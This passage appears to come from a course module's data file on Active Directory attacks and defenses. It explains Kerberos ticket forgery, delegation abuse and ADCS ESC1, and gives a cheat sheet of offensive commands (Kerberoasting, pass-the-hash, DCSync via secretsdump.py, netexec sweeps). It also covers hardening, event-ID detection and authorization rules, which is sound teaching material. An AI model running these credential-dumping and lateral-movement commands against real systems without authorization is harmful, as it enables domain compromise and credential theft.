<p>Both are forged Kerberos tickets, but they forge different things and at different scope. A golden ticket is a forged TGT, built using the krbtgt account's own secret key, which lets an attacker fabricate a ticket asserting any identity and any group membership — since every service in the domain trusts a TGT signed with that key, it grants domain-wide access. A silver ticket is narrower: it forges a service ticket directly using one specific service account's key, so its reach is limited to whatever that one service does — but presenting a silver ticket never involves the KDC at all, unlike using a golden-ticket-derived TGT to request further service tickets, which makes silver tickets harder to spot from DC-centric logging alone. Both bypass the KDC's real-time account checks (disablement, expiry, group changes) entirely, which is why the only real remediation once krbtgt is confirmed exposed is rotating its secret twice in succession.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is unconstrained delegation, and why is it considered dangerous to leave enabled?</div>
<div class="qa-a">
<p>A host configured for unconstrained delegation is trusted to impersonate any user to any other service in the domain — and as a side effect of how Kerberos implements this, a full copy of the TGT of anyone who authenticates to that host gets cached in its memory. That makes the host itself a high-value target: an attacker who compromises it can potentially harvest the TGTs of every user who connects afterward, and if a domain admin ever authenticates there for any reason, that's effectively domain compromise. The standard fix is replacing unconstrained delegation with constrained delegation (a pre-approved, explicit list of target services) or resource-based constrained delegation, and marking genuinely sensitive accounts as "cannot be delegated" so their tickets are never cached this way regardless of which host they touch.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is ADCS ESC1, and how does it let a low-privileged user become a domain admin?</div>
<div class="qa-a">
<p>ESC1 is a certificate-template misconfiguration in Active Directory Certificate Services. It requires three conditions at once: the template allows a low-privileged principal to enroll; it has the ENROLLEE_SUPPLIES_SUBJECT flag set, so the requester — not the CA — supplies the certificate's Subject Alternative Name; and it includes a Client Authentication EKU, meaning the resulting certificate can be used to log in. Combined, any user who can enroll in that template can request a certificate while naming an arbitrary identity, such as a domain admin's UPN, in the SAN field. The CA issues a technically valid certificate for that name, and Kerberos PKINIT then accepts that certificate to authenticate as the named account — all without ever touching that account's real password. The fix is auditing every enrollable template for that combination of flags (tools like Certipy do this in read-only audit mode) and removing ENROLLEE_SUPPLIES_SUBJECT or the low-privilege enrollment right wherever it isn't genuinely required.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">Why do modern write-ups say "netexec" instead of "crackmapexec," and does the switch change how enumeration is actually done?</div>
<div class="qa-a">
<p>crackmapexec was the tool that pioneered sweeping a network for valid credentials, shares, and lightweight remote command execution across many hosts at once, but its original maintainer retired from the project and it's been archived and unmaintained since 2023. netexec is a community-driven continuation of that same codebase and command surface, actively maintained and extended since. Day to day, the workflow doesn't really change — the command syntax carried over closely enough that older crackmapexec write-ups still translate almost directly — the main practical point is to reach for netexec going forward for active development, bug fixes, and new protocol modules, while recognizing crackmapexec commands in older material as the same tool under its previous name.</p>
</div>
</div>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'cheat-sheet', title: '📋 Cheat Sheet', html: `
<table>
  <thead><tr><th>Category</th><th>Tool / Concept</th><th>What it does / key command</th></tr></thead>
  <tbody>
    <tr><td>Kerberos</td><td>KDC (AS + TGS)</td><td>Runs on every DC; AS issues TGTs, TGS exchanges a TGT for a service ticket</td></tr>
    <tr><td>Kerberos</td><td>TGT / service ticket / SPN</td><td>TGT encrypted with krbtgt's key; service ticket encrypted with the target service account's own key</td></tr>
    <tr><td>Enumeration</td><td>BloodHound CE + SharpHound</td><td>Graph model of AD; <code>SharpHound.exe -c All</code>, then shortest-path queries in the BloodHound CE UI</td></tr>
    <tr><td>Enumeration</td><td>PowerView</td><td>Scriptable LDAP/ADSI cmdlets; <code>Get-DomainUser -SPN</code>, <code>Get-DomainComputer -Unconstrained</code></td></tr>
    <tr><td>Enumeration</td><td><code>ldapdomaindump</code></td><td>Dumps LDAP data to browsable HTML/JSON for reporting</td></tr>
    <tr><td>Enumeration / access</td><td>netexec (crackmapexec deprecated)</td><td>Sweep hosts for creds/shares; <code>netexec smb &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</code></td></tr>
    <tr><td>Credential attack</td><td>Kerberoasting — <code>GetUserSPNs.py</code></td><td>Requests SPN service tickets; crack offline with <code>hashcat -m 13100</code></td></tr>
    <tr><td>Credential attack</td><td>AS-REP roasting — <code>GetNPUsers.py</code></td><td>No-preauth accounts return crackable AS-REP; <code>hashcat -m 18200</code></td></tr>
    <tr><td>Lateral movement</td><td>Pass-the-Hash</td><td><code>psexec.py</code>/<code>wmiexec.py -hashes :&lt;hash&gt;</code> — auth with NTLM hash, no password needed</td></tr>
    <tr><td>Lateral movement</td><td>Pass-the-Ticket</td><td><code>KRB5CCNAME</code> + <code>-k -no-pass</code> — replay an existing Kerberos ticket</td></tr>
    <tr><td>Access / shell</td><td>Impacket suite</td><td><code>psexec.py</code> (service-based, loud), <code>wmiexec.py</code> (WMI, quieter), <code>secretsdump.py</code> (creds)</td></tr>
    <tr><td>Access / shell</td><td><code>evil-winrm</code></td><td>Interactive shell over WinRM; supports password or <code>-H</code> hash auth</td></tr>
    <tr><td>Credential dump</td><td>DCSync — <code>secretsdump.py</code></td><td>Replicates account secrets (incl. krbtgt) via MS-DRSR; requires existing replication rights</td></tr>
    <tr><td>Persistence (conceptual)</td><td>Golden ticket</td><td>Forged TGT using krbtgt's key — domain-wide, KDC-independent access; no exact forge steps taught here</td></tr>
    <tr><td>Persistence (conceptual)</td><td>Silver ticket</td><td>Forged service ticket using one service account's key — narrower, never touches the KDC</td></tr>
    <tr><td>Escalation (conceptual)</td><td>Unconstrained delegation abuse</td><td>Delegating host caches connecting users' TGTs in memory — high-value target if compromised</td></tr>
    <tr><td>Escalation (conceptual)</td><td>Resource-based constrained delegation (RBCD)</td><td>Write access to a computer object can grant self delegation rights onto it</td></tr>
    <tr><td>Escalation (conceptual)</td><td>ADCS ESC1</td><td>Enrollable template + attacker-supplied SAN + Client Auth EKU → certificate as anyone</td></tr>
    <tr><td>Defense</td><td>Tiering / PAW</td><td>Tier 0/1/2 admin separation; Privileged Access Workstations for Tier 0 credentials only</td></tr>
    <tr><td>Defense</td><td>LAPS</td><td>Randomizes and rotates each machine's local admin password — stops hash reuse across hosts</td></tr>
    <tr><td>Defense</td><td>gMSA</td><td>Auto-rotated, long random service-account passwords — defeats Kerberoasting outright</td></tr>
    <tr><td>Defense</td><td>Disable unconstrained delegation</td><td>Migrate to constrained/RBCD; mark sensitive accounts "cannot be delegated"</td></tr>
    <tr><td>Defense</td><td>ADCS hardening</td><td>Audit templates (Certipy/PSPKIAudit), remove ENROLLEE_SUPPLIES_SUBJECT, restrict Enroll rights</td></tr>
    <tr><td>Defense</td><td>Monitoring / event IDs</td><td>4768/4769/4771 (Kerberos), 4662 (DCSync GUIDs), 4672/4624 (privileged logons)</td></tr>
    <tr><td>Legal must-have</td><td>Explicit written scope for DC-targeting techniques</td><td>DCSync/ticket-forging capability named specifically in the RoE, or lab-only</td></tr>
  </tbody>
</table>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'edge-cases', title: '⚠️ Defenses & Legal', html: `
<div class="callout danger">
  <div class="callout-title">⚠️ Authorization for domain-controller-targeting techniques must be explicit</div>
  <p>DCSync and any technique that depends on it (including golden ticket forgery) can grant persistent, domain-wide access, and delegation/ADCS abuse can silently escalate a single low-privileged account to Domain Admin. Per the Rules of Engagement guidance in Foundations, Ethics &amp; Legal, a generic "internal AD testing authorized" scope statement is not sufficient for these — the RoE should name domain-controller-targeting techniques (DCSync, ticket forgery, ADCS certificate abuse) explicitly, and many organizations require immediate, out-of-band notification the moment one of these is proven, rather than waiting for the final report, precisely because remediation (e.g. a double krbtgt rotation) is disruptive and time-sensitive. Outside of an authorized engagement, keep every technique in this topic inside your own isolated lab domain.</p>
</div>

<h3>Tiering and Privileged Access Workstations (PAW)</h3>
<p>The <strong>tiering model</strong> separates administrative credentials by the blast radius of what they control: Tier 0 (domain controllers and anything that can control them, e.g. Domain Admins, ADCS, group policy), Tier 1 (servers and server admins), and Tier 2 (workstations and helpdesk-level admins) — with the hard rule that a higher tier's credentials must never be entered on a lower tier's asset. <strong>Privileged Access Workstations (PAWs)</strong> enforce this physically: Tier 0 credentials are only ever used from dedicated, hardened, non-internet-browsing workstations, so that compromising a user's everyday laptop (the most common initial-access vector) can't cascade into a cached domain admin credential. This single architectural change closes off most of the unconstrained-delegation and credential-caching abuse paths covered in Mechanics, because a Tier 0 credential simply never touches a machine an attacker is likely to compromise first.</p>

<h3>LAPS (Local Administrator Password Solution)</h3>
<p>Without LAPS, many environments ship every machine from the same golden image with an identical local Administrator password — meaning one cracked or dumped local hash (Example 4 in Worked Examples) works everywhere, turning a single foothold into lateral access across the whole fleet. <strong>LAPS</strong> randomizes and periodically rotates each machine's local admin password independently, storing the current value in a protected AD attribute readable only by authorized admins — directly closing off that specific credential-reuse path.</p>

<h3>gMSA (group Managed Service Accounts)</h3>
<p>Kerberoasting only works because a human-chosen service-account password can be weak enough to crack offline. <strong>gMSAs</strong> remove that weakness entirely: AD generates and automatically rotates a long (120-character), fully random password on a schedule, with no human ever needing to know or type it — a Kerberoasted ticket from a gMSA-backed service is, for all practical purposes, uncrackable. Migrating Kerberoastable service accounts to gMSAs (where the service supports it) is the single most direct fix for the Kerberoasting technique covered in Mechanics.</p>

<h3>Strong SPN account passwords, where gMSA migration isn't possible</h3>
<p>Not every legacy service supports gMSA. For those, enforcing a long (25+ character), fully random password on any account that holds an SPN achieves the same practical outcome — it doesn't prevent Kerberoasting from happening, but it makes the resulting offline crack computationally infeasible, which is the actual goal.</p>

<h3>Disable unconstrained delegation</h3>
<p>Per the abuse pattern in Mechanics, any host trusted for unconstrained delegation is a standing risk of harvesting the TGTs of whoever connects to it. Audit for it directly (BloodHound flags it, and PowerView's <code>Get-DomainComputer -Unconstrained</code> lists it explicitly), migrate those services to constrained delegation or RBCD with the narrowest possible target list, and mark any genuinely sensitive account (particularly Tier 0 accounts) as "Account is sensitive and cannot be delegated," which prevents its ticket from ever being cached this way regardless of which host it touches.</p>

<h3>ADCS hardening</h3>
<p>Audit every enrollable certificate template for the ESC1 combination described in Mechanics (and the other documented ESC# variants) using a dedicated auditing tool such as Certipy (read-only <code>-vulnerable</code> mode) or PSPKIAudit, remove the <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag from any template that includes a Client Authentication EKU, and restrict Enroll permission on sensitive templates to the specific principals that genuinely need it rather than broad groups like Domain Users or Authenticated Users.</p>

<h3>Monitoring and detection: the Windows event IDs that matter most</h3>
<p>Every technique in this topic leaves a detectable trail if the right events are collected and correlated (typically via a SIEM):</p>
<ul>
  <li><strong>4768</strong> (TGT requested) and <strong>4769</strong> (TGS requested) — a burst of 4769 events for many different SPNs from one account in a short window is a strong Kerberoasting indicator; watch specifically for RC4 encryption (ticket encryption type <code>0x17</code>) on domains that otherwise enforce AES, which often signals a deliberate downgrade to produce an easier-to-crack ticket.</li>
  <li><strong>4771</strong> (Kerberos pre-authentication failed) — a wave of 4771 failures for many different usernames from one source is a strong AS-REP roasting indicator (an attacker probing which accounts have pre-auth disabled).</li>
  <li><strong>4662</strong> (an operation was performed on an object) — watch for this event referencing the well-known GUIDs for "Replicating Directory Changes" / "Replicating Directory Changes All," generated from a source that isn't a legitimate domain controller: the single highest-value DCSync detection signal.</li>
  <li><strong>4672</strong> (special privileges assigned to a new logon) and <strong>4624</strong>/<strong>4625</strong> (logon success/failure) — correlate for anomalous privileged logons, especially a Pass-the-Hash pattern (NTLM logon type 3 for an account that never normally authenticates that way, with no corresponding interactive logon).</li>
  <li><strong>krbtgt rotation</strong> as an ongoing practice, not just an incident response — periodically rotating the krbtgt secret (twice, in succession, to fully invalidate the previous key too) limits how long any undetected golden-ticket exposure window can remain useful even before it's discovered.</li>
</ul>

<h3>Authorization is the constant</h3>
<p>None of the defenses above change the core rule from Foundations, Ethics &amp; Legal: only run any technique from this topic against systems you own, or that you have explicit, written, in-scope authorization to test — with domain-controller-targeting techniques (DCSync, ticket forgery, ADCS abuse) named specifically, given how far-reaching and how difficult to fully remediate their effects can be.</p>
`}

]});
